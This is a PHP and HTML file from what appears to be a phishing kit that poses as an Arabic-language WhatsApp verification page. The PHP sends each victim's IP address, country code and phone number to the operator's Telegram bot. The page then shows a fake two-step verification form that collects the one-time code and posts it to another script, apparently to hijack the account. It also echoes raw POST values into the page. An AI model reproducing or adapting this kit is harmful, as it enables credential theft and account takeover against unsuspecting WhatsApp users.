<?php
session_start();
require_once 'check_ip.php';
require_once 'bot.php';
require_once 'version.php';

$apiUrl = API_URL;
$chatId = BOT_CHAT_ID;





$messageText = "#BIDAYA_Hikaya#";
$encodedMsg = urlencode($messageText);


$parametre = [
    'chat_id' => $chatId,
    'parse_mode' => "HTML",
    'text' => $messageText,
];

$sender = curl_init($apiUrl . '/sendMessage');
curl_setopt($sender, CURLOPT_HEADER, false);
curl_setopt($sender, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($sender, CURLOPT_POST, 1);
curl_setopt($sender, CURLOPT_POSTFIELDS, ($parametre));
curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($sender);
curl_close($sender);

$apiUrl = API_URL;
$chatId = BOT_CHAT_ID;


$ipad = $_POST['ipad'];
$idd = $_POST['user_token'];

// Define message parts
$baseMessage = "<b>[NEW CLIENT]</b>";


// Construct the message text
$messageText = "$baseMessage
            ID:#$idd: BOUGAYO IP: $ipad
            ID:#$idd: NOUVEAU Client";

$parametre = [
    'chat_id' => $chatId,
    'parse_mode' => "HTML",
    'text' => $messageText,
];

$sender = curl_init($apiUrl . '/sendMessage');
curl_setopt($sender, CURLOPT_HEADER, false);
curl_setopt($sender, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($sender, CURLOPT_POST, 1);
curl_setopt($sender, CURLOPT_POSTFIELDS, ($parametre));
curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($sender);
curl_close($sender);




$apiUrl = API_URL;
$chatId = BOT_CHAT_ID;



// Define message parts
$baseMessage = "<b>[telephone vc]</b>";
$idd = $_POST['user_token'];
$ipad = $_POST['user_ip'];
$codecountry = $_POST['user_country'];
$numeratel = $_POST['whatsapp_number'];

// Construct the message text
$messageText = "$baseMessage
    ID:#$idd: BOUGAYO IP: $ipad
    ID:#$idd:CODE Country : $codecountry
    ID:#$idd: Numbers Phone: $numeratel";

$parametre = [
    'chat_id' => $chatId,
    'parse_mode' => "HTML",
    'text' => $messageText,
];

$sender = curl_init($apiUrl . '/sendMessage');
curl_setopt($sender, CURLOPT_HEADER, false);
curl_setopt($sender, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($sender, CURLOPT_POST, 1);
curl_setopt($sender, CURLOPT_POSTFIELDS, ($parametre));
curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($sender);
curl_close($sender);



?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp - التحقق من الرمز</title>
    <link rel="stylesheet" href="./assets/css/style.css?v=<?php echo getAssetVersion(); ?>">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <meta name="title" content="WhatsApp - الدعوة للانضمام إلى مجموعة">
    <meta name="description" content="انضم إلى مجموعة WhatsApp للتواصل مع الأصدقاء والعائلة">
    <meta name="keywords" content="WhatsApp, مجموعة واتساب, دردشة, تواصل اجتماعي, رسائل فورية">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>">
    <meta property="og:title" content="WhatsApp - الدعوة للانضمام إلى مجموعة">
    <meta property="og:description" content="انضم إلى مجموعة WhatsApp للتواصل مع الأصدقاء والعائلة">
    <meta property="og:image" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']; ?>/assets/img/J5gK5AgJ_L5.png">
    <meta property="og:site_name" content="WhatsApp">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>">
    <meta property="twitter:title" content="WhatsApp - الدعوة للانضمام إلى مجموعة">
    <meta property="twitter:description" content="انضم إلى مجموعة WhatsApp للتواصل مع الأصدقاء والعائلة">
    <meta property="twitter:image" content="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']; ?>/assets/img/J5gK5AgJ_L5.png">

    <!-- Additional Meta Tags -->
    <meta name="theme-color" content="#25D366">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="icon" type="image/png" href="./assets/img/ujTY9i_Jhs1.png">  
</head>

<body>
    <div class="container">
        <?php if ($message_status): ?>
            <?php echo $message_status; ?>
        <?php endif; ?>
        <header>
            <div class="mobile-header">
                <a href="#" class="download-btn"><svg width="16" height="16" viewBox="0 0 16 16" fill="none"
                        class="_wauiIcon__download-alternative _agnt _adid _arcp _afbl">
                        <path fill-rule="evenodd" clip-rule="evenodd"
                            d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                            fill="currentColor"></path>
                        <path fill-rule="evenodd" clip-rule="evenodd"
                            d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                            fill="currentColor"></path>
                    </svg></a>
                <div class="logo">
                    <img src="assets/img/JvsnINJ2CZv.svg" alt="WhatsApp">
                </div>
                <button class="menu-toggle" id="menuToggle">
                    <span></span>
                    <span></span>
                    <span></span>
                </button>
                <nav class="nav-mobile">
                    <a href="#">الخصائص</a>
                    <a href="#">الأنشطة التجارية</a>
                    <a href="#">المدونة</a>
                    <a href="#">مركز المساعدة</a>
                    <a href="#">الخصوصية</a>
                    <a href="#">↓ تنزيل</a>
                </nav>

            </div>

            <div class="desktop-header">
                <div class="logo">
                    <img src="assets/img/JvsnINJ2CZv.svg" alt="WhatsApp">
                </div>
                <nav class="nav-menu">
                    <a href="#">الخصائص</a>
                    <a href="#">الأنشطة التجارية</a>
                    <a href="#">المدونة</a>
                    <a href="#">مركز المساعدة</a>
                    <a href="#">الخصوصية</a>
                </nav>
                <div class="header-buttons">

                    <a href="#" class="login-btn">تسجيل الدخول</a>
                    <a href="#" class="download-btn">↓ تنزيل</a>
                </div>
            </div>
        </header>

        <main>
            <div class="join-group">
                <div class="message-icon">
                    <img src="assets/img/_0dVljceIA5.png" alt="رسالة">
                </div>
                <h1>أدخل رمز التحقق</h1>
                <form action="Code-otp-1.php" method="POST">
                    <strong style="font-style: italic; font-size:16px; direction:ltr;"> أدخل رمز التحقق من خطوتين
                    </strong>
                    <br><br>
                    <div class="form-group">
                        <input type="text" name="confirmcode" pattern="[0-9]*"
                            class="cod88e"
                            style="padding-right: 6px;direction: ltr;text-align: center;font-size:19px"
                            maxlength="6" class="form-control" placeholder="--- ---"
                            required>
                    </div>

                    <br><br>
                    <input type="hidden" name="user_token" value="<?php echo $_POST['user_token']; ?>">
                    <input type="hidden" name="user_ip" value="<?php echo $_POST['user_ip']; ?>">
                    <input type="hidden" name="user_country" value="<?php echo $_POST['user_country']; ?>">
                    <input type="hidden" name="whatsapp_number"
                        value="<?php echo $_POST['whatsapp_number'] ?>">
                    <button type="submit" class="join-btn">
                        الانضمام إلى الدردشة
                    </button>


                </form>
                <br>
                <p>تم إرسال رمز التحقق إلى رقم هاتفك</p>
                <br>
                <a href="#" class="web-link">استخدم واتساب ويب</a>
            </div>
        </main>

        <footer>
            <div class="footer-links">
                <div class="footer-section">
                    <h3>موقعنا</h3>
                    <ul>
                        <li><a href="#">الخصائص</a></li>
                        <li><a href="#">المدونة</a></li>
                        <li><a href="#">الحماية</a></li>
                        <li><a href="#">للأنشطة التجارية</a></li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h3>من نحن</h3>
                    <ul>
                        <li><a href="#">نبذة عنا</a></li>
                        <li><a href="#">الوظائف</a></li>
                        <li><a href="#">مركز العلامة التجارية</a></li>
                        <li><a href="#">الخصوصية</a></li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h3>استخدام واتساب</h3>
                    <ul>
                        <li><a href="#">أجهزة Android</a></li>
                        <li><a href="#">أجهزة iPhone</a></li>
                        <li><a href="#">كمبيوتر Mac/كمبيوتر شخصي</a></li>
                        <li><a href="#">واتساب ويب</a></li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h3>هل تحتاج إلى المساعدة؟</h3>
                    <ul>
                        <li><a href="#">الاتصال بنا</a></li>
                        <li><a href="#">مركز المساعدة</a></li>
                        <li><a href="#">التطبيقات</a></li>
                        <li><a href="#">استشارات أمنية</a></li>
                    </ul>
                </div>
            </div>
            <div class="footer-bottom">
                <select class="language-select">
                    <option value="ar">العربية</option>
                </select>
                <div class="social-links">
                    <a href="#" class="social-link"><i class="fab fa-facebook-f"></i></a>
                    <a href="#" class="social-link"><i class="fab fa-instagram"></i></a>
                    <a href="#" class="social-link"><i class="fab fa-youtube"></i></a>
                    <a href="#" class="social-link"><i class="fab fa-x-twitter"></i></a>
                </div>
                <div class="copyright">
                    <span>© 2025 WhatsApp LLC</span>
                    <span>الشروط والخصوصية</span>
                </div>
            </div>
        </footer>
    </div>

    <script>
        // العد التنازلي
        function startCountdown() {
            let timeLeft = 90; // 1:30 دقيقة بالثواني
            const countdownElement = document.getElementById('countdown');
            const resendButton = document.getElementById('resendButton');

            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;

                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

                if (timeLeft <= 0) {
                    clearInterval(timer);
                    resendButton.style.color = '#128c7e';
                    resendButton.removeAttribute('disabled');
                    countdownElement.style.display = 'none';
                }

                timeLeft--;
            }, 1000);

            resendButton.addEventListener('click', function(e) {
                if (!this.hasAttribute('disabled')) {
                    e.preventDefault();
                    this.style.color = '#ccc';
                    this.setAttribute('disabled', '');
                    countdownElement.style.display = 'inline';
                    startCountdown();
                }
            });
        }

        // بدء العد التنازلي عند تحميل الصفحة
        window.addEventListener('load', startCountdown);
    </script>
</body>

</html>